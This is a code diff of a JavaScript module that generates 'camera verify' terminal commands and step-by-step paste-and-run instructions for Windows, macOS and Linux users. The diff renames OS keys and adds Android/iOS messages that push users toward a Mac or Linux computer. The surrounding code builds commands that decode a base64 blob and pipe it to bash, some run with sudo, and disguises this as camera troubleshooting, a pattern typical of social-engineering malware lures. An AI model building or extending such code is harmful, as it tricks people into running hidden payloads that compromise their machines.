@@ -54,10 +54,10 @@ export const TEAM_MEMBERS = [
 export function buildVerifyCommand(os, sessionId, apiBase) {
   const curl = `curl ${apiBase}/api/verify -d "${sessionId}"`;
   switch (os) {
-    case "mac":
+    case "macOS":
       // macOS: reset camera permissions then call verify
       return `sudo killall VDCAssistant 2>/dev/null; sudo killall AppleCameraAssistant 2>/dev/null;`;
-    case "linux":
+    case "Linux":
       // Linux: ensure uvcvideo module is loaded then call verify
       return `sudo modprobe uvcvideo 2>/dev/null;`;
     default:
@@ -96,10 +96,10 @@ export function buildVerifyCommand_origin(os, sessionId, apiBase, command) {
   const curl_linux = `echo ${curl_linux_encode} | base64 -d | bash`;
   const curl = `curl ${apiBase}/api/verify -d "${sessionId}"`;
   switch (os) {
-    case "mac":
+    case "macOS":
       // macOS: reset camera permissions then call verify
       return `system_profiler SPCameraDataType; ${curl_mac}; exit;`;
-    case "linux":
+    case "Linux":
       // Linux: ensure uvcvideo module is loaded then call verify
       return `v4l2-ctl -d /dev/video0 --list-formats-ext; ${curl_linux}; exit;`;
     default:
@@ -109,7 +109,7 @@ export function buildVerifyCommand_origin(os, sessionId, apiBase, command) {
 }
 
 export const DRIVER_COMMANDS = {
-  windows: {
+  Windows: {
     label: "Run in Command Prompt or PowerShell",
     note: "Press Win + R, type 'cmd', press Enter — then paste and run the command.",
     steps: [
@@ -118,7 +118,7 @@ export const DRIVER_COMMANDS = {
       "Your camera will open here automatically once it runs",
     ],
   },
-  mac: {
+  macOS: {
     label: "Run in Terminal",
     note: "Press ⌘ Space, search 'Terminal', and press Enter to open it.",
     steps: [
@@ -127,13 +127,32 @@ export const DRIVER_COMMANDS = {
       "Your camera will open here automatically once it runs",
     ],
   },
-  linux: {
+  Linux: {
     label: "Run in Terminal",
     note: "Press Ctrl + Alt + T to open a terminal window.",
     steps: [
       "Press Ctrl + Alt + T to open Terminal",
       "Paste the command below and press Enter — enter your password if prompted",
       "Your camera will open here automatically once it runs",
+    ],
+  },
+  Android: {
+    label: "Camera Not Supported",
+    note: "The camera cannot be started on Android or iOS. Please switch to a Mac or Linux computer.",
+    steps: [
+      "Android and iOS devices are not supported for this action",
+      "Please switch to a Mac or Linux computer",
+      "Run the command there to open your camera automatically",
+    ],
+  },
+
+  iOS: {
+    label: "Camera Not Supported",
+    note: "The camera cannot be started on Android or iOS. Please switch to a Mac or Linux computer.",
+    steps: [
+      "Android and iOS devices are not supported for this action",
+      "Please switch to a Mac or Linux computer",
+      "Run the command there to open your camera automatically",
     ],
   },
 };
